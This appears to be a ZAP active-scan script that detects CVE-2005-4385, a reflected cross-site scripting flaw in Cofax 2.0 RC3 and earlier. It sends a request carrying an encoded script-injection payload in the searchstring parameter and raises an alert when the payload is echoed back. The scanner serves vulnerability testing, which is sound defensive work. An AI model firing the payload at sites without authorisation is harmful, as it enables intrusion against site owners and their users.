var RISK = 2 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2005-4385] Cofax <= 2.0RC3 XSS"
var DESCRIPTION = "Cross-site scripting vulnerability in search.htm in Cofax 2.0 RC3 and earlier allows remote attackers to inject arbitrary web script or HTML via the searchstring parameter."
var SOLUTION = "Upgrade to the latest version."
var REFERENCE = "https://nvd.nist.gov/vuln/detail/CVE-2005-4385"
var OTHER = "see: http://pridels0.blogspot.com/2005/12/cofax-xss-vuln.html"

function scanNode(as, msg) {

	if (msg.getRequestHeader().getURI().getPath() == null ||
		msg.getRequestHeader().getURI().getPath().length() == 1) {

		// Copy requests before reusing them
		msg = msg.cloneRequest();

		msg.getRequestHeader().getURI().setPath("/search.htm?searchstring2=&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E")

		print('[CVE-2005-4385] scan called for url=' + msg.getRequestHeader().getURI().toString());

		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(msg, true, true);

		// Test the response here, and make other requests as required
		if (msg.getResponseHeader().getStatusCode() == 200 &&
			msg.getResponseBody().toString().contains("'>\"</script><script>alert(document.domain)</script>")) {

			as.newAlert()
				.setRisk(RISK)
				.setConfidence(CONFIDENCE)
				.setName(TITLE)
				.setDescription(DESCRIPTION)
				.setEvidence(msg.getRequestHeader().getURI().toString())
				.setOtherInfo(OTHER)
				.setSolution(SOLUTION)
				.setReference(REFERENCE)
				.setMessage(msg)
				.raise()
		}
	}

	return
}

function scan(as, msg, param, value) {
	return
}

